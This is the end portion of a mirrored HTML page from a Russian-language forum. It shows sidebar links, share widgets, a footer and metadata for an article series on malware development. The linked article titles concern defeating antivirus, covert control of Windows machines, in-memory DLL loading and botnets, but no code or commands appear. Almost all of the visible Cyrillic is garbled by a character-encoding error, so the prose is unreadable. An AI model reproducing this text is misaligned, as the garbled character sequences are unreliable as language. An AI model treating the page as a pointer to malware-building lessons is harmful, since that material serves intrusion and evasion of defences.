				–ü–æ–∫–∞ —Ö–∞–∫–µ—Ä –Ω–µ –ø—Ä–∏–∫—Ä—ã–ª–∏, –∏–∑-–∑–∞ –¥—É—Ä–∞—Ü–∫–∏—Ö –∑–∞–∫–æ–Ω–æ–≤, —Ä–µ—à–∏–ª —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∏–≤–∞—Ç–Ω—É—é —Å—Ç–∞—Ç—å—é.

–í–æ—Ç...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../unichtozhayem-signaturnyye-antivirusy.57/index.html">–£–Ω–∏—á—Ç–æ–∂–∞–µ–º —Å–∏–≥–Ω–∞—Ç—É—Ä–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã</a>

			
			
			<div class="contentRow-snippet">
				–ö–æ–≥–¥–∞-—Ç–æ –¥–∞–≤–Ω–æ —Ç–∞–∫–∏–µ —Ç—É–ª–∑—ã –±—ã–ª–∏ –ø–æ–ø—É–ª—è—Ä–Ω—ã, –≤–æ–∑–º–æ–∂–Ω–æ –∏ —Å–µ–π—á–∞—Å –±—É–¥–µ—Ç –Ω–∞—Ö–æ–¥–∫–æ–π, –∫—Ç–æ –∑–∞–Ω–∏–º–∞–µ—Ç—Å—è...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../skrytoye-upravleniye-komp-yuterom-na-windows-adovaya-stat-ya.56/index.html">–°–∫—Ä—ã—Ç–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º –Ω–∞ Windows, –∞–¥–æ–≤–∞—è —Å—Ç–∞—Ç—å—è</a>

			
			
			<div class="contentRow-snippet">
				–°—Ç–∞—Ç—å—è –Ω–µ –Ω–æ–≤–∞—è, –Ω–∞—à–µ–ª –Ω–∞ —Å—Ç–∞—Ä–æ–º —Ñ–æ—Ä—É–º–µ, –Ω–æ –Ω–µ –ø–ª–æ—Ö–æ –æ–ø–∏—Å–∞–Ω–æ –≤—Å—ë.

–í–æ–∑–º–æ–∂–Ω–æ –∫–∞–∫–∏–µ-—Ç–æ –∫–æ–º–∞–Ω–¥—ã...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../memorymodule-zagruzka-dll-iz-ozu.22/index.html">MemoryModule - –ó–∞–≥—Ä—É–∑–∫–∞ DLL –∏–∑ –û–ó–£</a>

			
			
			<div class="contentRow-snippet">
				–ö–æ–≥–¥–∞-—Ç–æ –¥–∞–≤–Ω–æ –ø–∏—Å–∞–ª —Å–≤–æ–π –∑–∞–≥—Ä—É–∑—á–∏–∫ DLL, –Ω–æ —Å–µ–π—á–∞—Å –Ω–∞ –≥–∏—Ç—Ö–∞–±–µ –Ω–∞—Ç–∫–Ω—É–ª—Å—è –Ω–∞ –±–æ–ª–µ–µ –≤–∑—Ä–æ—Å–ª—ã–π...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../pro-botnet-i-kak-delat-nel-zya.16/index.html">–ü—Ä–æ –±–æ—Ç–Ω–µ—Ç –∏ –∫–∞–∫ –¥–µ–ª–∞—Ç—å –Ω–µ–ª—å–∑—è</a>

			
			
			<div class="contentRow-snippet">
				–ö–æ–≥–¥–∞-—Ç–æ –¥–∞–≤–Ω–æ —É—á–∞—Å—Ç–≤–æ–≤–∞–ª –≤ –∫–æ–Ω–∫—É—Ä—Å–µ —Å—Ç–∞—Ç–µ–π –Ω–∞ xss.is, –º—ã —Ä–µ—à–∏–ª–∏ –¥–ª—è –∫–æ–Ω–∫—É—Ä—Å–∞ —Å–¥–µ–ª–∞—Ç—å –±–æ—Ç–Ω–µ—Ç...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
			<div class="block-container">
				
					<h3 class="block-minorHeader"><a href="../authors/0x42.1/index.html">–ë–æ–ª—å—à–µ –æ—Ç 0x42</a></h3>
				

				<div class="block-body block-row">
					<ul class="articleSidebarList">
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../o-tom-kak-boryut-sya-s-tor-v-rf.75/index.html">–û —Ç–æ–º –∫–∞–∫ –±–æ—Ä—é—Ç—Å—è —Å TOR –≤ –†–§</a>

			
			
			<div class="contentRow-snippet">
				–ù–µ–¥–∞–≤–Ω–æ —Ä–µ—à–∏–ª –ø–æ–¥–¥–µ—Ä–∂–∞—Ç—å –ø—Ä–æ–µ–∫—Ç TOR, —Ä–µ—à–∏–ª –ø–æ–¥–Ω—è—Ç—å middle relay.

–ù–∞–ø–æ–º–Ω—é, —á—Ç–æ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../bezumnyi-maks-skam.74/index.html">–ë–µ–∑—É–º–Ω—ã–π –ú–ê–ö–°/–°–ö–ê–ú</a>

			
			
			<div class="contentRow-snippet">
				–ü–æ —Ç–µ–ª–µ–≤–∏–∑–æ—Ä—É –ø–µ—Ä–µ–¥–∞—é—Ç, —á—Ç–æ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä –ú–ê–ö–° –ø–æ–ª—é–±–∏–ª–∏ —Ä–æ—Å—Å–∏—è–Ω–µ, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª–æ—Å—å –ø–æ—á—Ç–∏ –≤—Å—è...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../pochemu-v-linux-vse-fail.73/index.html">–ü–æ—á–µ–º—É –≤ Linux –≤—Å—ë ‚Äî —Ñ–∞–π–ª?</a>

			
			
			<div class="contentRow-snippet">
				---

## üîπ –û–≥–ª–∞–≤–ª–µ–Ω–∏–µ

[1. –§–∏–ª–æ—Å–æ—Ñ–∏—è UNIX: ¬´Everything is a file¬ª]
[2. –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç VFS ‚Äî Virtual...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../zashchita-ot-roskomnadzora.70/index.html">–ó–∞—â–∏—Ç–∞ –æ—Ç –†–æ—Å–∫–æ–º–Ω–∞–¥–∑–æ—Ä–∞</a>

			
			
			<div class="contentRow-snippet">
				–í —Å–≤—è–∑–∏ —Å —Ç–µ–º-—á—Ç–æ –†–ö–ù –≤–Ω–µ–¥—Ä–∏–ª–∏ –±–æ—Ç–æ–≤ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–∏—Å–∫–∞ –Ω–µ—É–≥–æ–¥–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ –∏...
			</div>				

			
		</div>
	</div>

						</li>
					
						<li>
							
	
	<div class="contentRow">
		<div class="contentRow-figure">
			<a href="https://osint42.org/members/0x42.1/" class="avatar avatar--xxs" data-user-id="1" data-xf-init="member-tooltip">
			<img src="../../data/avatars/s/0/1b812.jpg?1746634773"  alt="0x42" class="avatar-u1-s" width="48" height="48" loading="lazy" /> 
		</a>
		</div>
		
		<div class="contentRow-main contentRow-main--close">
			<a href="../uyazvimosti-v-bash-skriptakh.69/index.html">–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ bash —Å–∫—Ä–∏–ø—Ç–∞—Ö</a>

			
			
			<div class="contentRow-snippet">
				–í–æ—Ç –∫—Ç–æ —Ö–æ—Ç—å —Ä–∞–∑ –∏–Ω—Ç–µ—Ä–µ—Å–æ–≤–∞–ª—Å—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é, –Ω–∞–≤–µ—Ä–Ω–æ–µ –ø–æ–º–Ω—è—Ç –≤—Å—è–∫–∏–µ –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ php –∏ –Ω–µ...
			</div>				

			
		</div>
	</div>

						</li>
					
					</ul>
				</div>
			</div>
		</div>
						
							<div class="block">
				<div class="block-container">
					
						<h3 class="block-minorHeader">–ü–æ–¥–µ–ª–∏—Ç—å—Å—è —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ–π</h3>
						
							<div class="block-body block-row block-row--separated">
								
									

	

	
		

		<div class="shareButtons shareButtons--iconic" data-xf-init="share-buttons" data-page-url="" data-page-title="" data-page-desc="" data-page-image="">
			<span class="u-anchorTarget" id="_xfUid-1-1758965544"></span>

			

			<div class="shareButtons-buttons">
				
					

					

					

					

					

					

					

					

					
						<a class="shareButtons-button shareButtons-button--email" href="#_xfUid-1-1758965544" data-href="mailto:?subject={title}&amp;body={url}">
							<i class="fa--xf far fa-envelope "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#envelope"></use></svg></i>
							<span>–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--share is-hidden" href="#_xfUid-1-1758965544"
							data-xf-init="web-share"
							data-title="" data-text="" data-url=""
							data-hide=".shareButtons-button:not(.shareButtons-button--share)">

							<i class="fa--xf far fa-share-alt "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#share-alt"></use></svg></i>
							<span>–ü–æ–¥–µ–ª–∏—Ç—å—Å—è</span>
						</a>
					

					
						<a class="shareButtons-button shareButtons-button--link is-hidden" href="#_xfUid-1-1758965544" data-clipboard="{url}">
							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
							<span>–°—Å—ã–ª–∫–∞</span>
						</a>
					
				
			</div>
		</div>
	

								
							</div>
						
						
							<div class="block-body block-row block-row--separated">
								
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-2-1758965544">–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å BB-–∫–æ–¥ –∞–¥—Ä–µ—Å–∞ —Å—Ç–∞—Ç—å–∏</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/&quot;]–¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;[/URL]" id="_xfUid-2-1758965544" />
		</div>
	</div>

									
									
										
	

	

	<div class="shareInput" data-xf-init="share-input" data-success-text="">
		
			<label class="shareInput-label" for="_xfUid-3-1758965544">–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å BB-–∫–æ–¥ —Å—Ç–∞—Ç—å–∏</label>
		
		<div class="inputGroup inputGroup--joined">
			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
				data-xf-init="tooltip" title="–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞">

				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
			</div>
			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=article, 6][/AMS]" id="_xfUid-3-1758965544" />
		</div>
	</div>

									
								
							</div>
						
					
				</div>
			</div>
						
						
					</div>
				
			</div>

			
			
	
		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">–£—Ä–æ–∫–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Å–æ—Ñ—Ç–∞</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			
		</div>
	</div>

	<footer class="p-footer" id="footer">
		<div class="p-footer-inner">

			<div class="p-footer-row">
				
					<div class="p-footer-row-main">
						<ul class="p-footer-linkList">
							
								
								
									<li>
										
											
											
												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
													class="js-styleVariationsLink"
													data-xf-init="tooltip" title=" –í—ã–±–æ—Ä —Å—Ç–∏–ª—è"
													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">

													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>–í—ã–±–æ—Ä —Å—Ç–∏–ª—è</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
												</a>

												<div class="menu" data-menu="menu" aria-hidden="true">
													<div class="menu-content js-styleVariationsMenu">
														

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			–°–∏—Å—Ç–µ–º–Ω—ã–π
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			–°–≤–µ—Ç–ª—ã–π
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			–¢—ë–º–Ω—ã–π
		
	</a>

	

	
		
	

													</div>
												</div>
											
										
									</li>
								
								
									<li><a href="../../misc/language.html" data-xf-click="overlay"
										data-xf-init="tooltip" title="–í—ã–±–æ—Ä —è–∑—ã–∫–∞" rel="nofollow">
										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> –†—É—Å—Å–∫–∏–π (RU)</a></li>
								
							
						</ul>
					</div>
				
				<div class="p-footer-row-opposite">
					<ul class="p-footer-linkList">
						

						
							<li><a href="../../threads/pravila-resursa.56/index.html">–£—Å–ª–æ–≤–∏—è –∏ –ø—Ä–∞–≤–∏–ª–∞</a></li>
						

						
							<li><a href="../../help/privacy-policy/index.html">–ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a></li>
						

						
							<li><a href="../../help/index.html">–ü–æ–º–æ—â—å</a></li>
						

						
							<li><a href="../../forums/index.html">–ì–ª–∞–≤–Ω–∞—è</a></li>
						

						<li><a href="../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
					</ul>
				</div>
			</div>

			

			
		</div>
	</footer>
</div> <!-- closing p-pageWrapper -->

<div class="u-bottomFixer js-bottomFixTarget">
	
	
</div>

<div class="u-navButtons js-navButtons">
	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">–ù–∞–∑–∞–¥</span></span></a>
</div>


	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">–í–µ—Ä—Ö</span></span></a>
		
			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">–ù–∏–∑</span></span></a>
		
	</div>



	<form style="display:none" hidden="hidden">
		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
	</form>

	





    
    
        
        
            <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="application/ld+json">
                {
    "@context": "https://schema.org",
    "@type": "CreativeWorkSeries",
    "@id": "https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/",
    "name": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "headline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "alternativeHeadline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "description": "\u0412\u0441\u0435\u043c \u043f\u0440\u0438\u0432\u0435\u0442!\n\n\u0420\u0435\u0448\u0438\u043b \u043f\u0435\u0440\u0435\u043f\u043e\u0441\u0442\u0438\u0442\u044c \u0441\u0432\u043e\u0439 \u0446\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \u043f\u043e \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u043c\u0430\u043b\u0432\u0430\u0440\u0438.\n\n\u0421\u0442\u0430\u0442\u044c\u0438 \u0431\u0443\u0434\u0443\u0442 \u043e\u0444\u043e\u0440\u043c\u043b\u0435\u043d\u044b \u0432 \u0432\u0438\u0434\u0435 \u0446\u0438\u043a\u043b\u0430 \u0441\u0442\u0430\u0442\u0435\u0439.)\n\n\u0417\u0430\u0447\u0435\u043c \u0438\u0437\u0443\u0447\u0430\u0442\u044c \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0443 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c ?\n\n\u0415\u0441\u0442\u044c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438\u0447\u0438\u043d, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u044b\u043c \u043a\u0442\u043e-\u0442\u043e \u0445\u043e\u0442\u0435\u043b \u0431\u044b \u0438\u0437\u0443\u0447\u0438\u0442\u044c \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0443...",
    "keywords": "",
    "dateCreated": "2025-05-08T10:54:22+00:00",
    "dateModified": "2025-05-09T13:44:30+00:00",
    "author": {
        "@type": "Person",
        "name": "0x42"
    },
    "thumbnailUrl": "https://osint42.org/data/attachments/0/461-fe6cde66a76ccea3bc62562247a1c9c2.jpg?hash=EZvMhSt-Dp",
    "interactionStatistic": [
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/CommentAction",
            "userInteractionCount": "2"
        },
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/LikeAction",
            "userInteractionCount": "4"
        },
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/ViewAction",
            "userInteractionCount": "9577"
        }
    ]
}
            </script>
        
    



	
			
	

				
			
		
		
	

</body>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/?full=1 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:43:16 GMT -->
</html>









